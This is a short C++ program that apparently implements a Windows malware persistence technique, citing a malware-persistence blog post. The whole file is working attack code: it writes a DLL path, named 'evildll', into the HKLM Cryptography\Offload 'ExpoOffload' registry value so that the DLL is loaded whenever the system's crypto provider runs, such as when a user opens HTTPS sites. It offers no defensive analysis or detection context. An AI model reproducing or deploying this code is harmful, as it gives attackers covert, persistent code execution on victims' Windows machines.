#include <windows.h>
#include <string.h>
#include <iostream>


//https://cocomelonc.github.io/malware/2022/10/21/malware-pers-16.html
//https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa387021(v=vs.85)
//Need admin rights, use check privlige before use this
//The CSP uses the entry point to perform all modular exponentiations for both public and private key operations
//dll is going to load when user opens things like https websites
int SuperTroll(const char* dllpath) {
    HKEY hkey = NULL;
    const wchar_t* path = L"SOFTWARE\\Microsoft\\Cryptography\\Offload";
    const char* evildll = dllpath;
    LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCWSTR)path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, 0);
    if (res == ERROR_SUCCESS) {
        RegSetValueExA(hkey, "ExpoOffload", 0, REG_SZ, (unsigned char*)evildll, strlen(evildll));
        RegCloseKey(hkey);
    }
    else {
        return res;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    const char* evildll = "C:\\testlib.dll";
    SuperTroll(evildll);
    return 0;
}
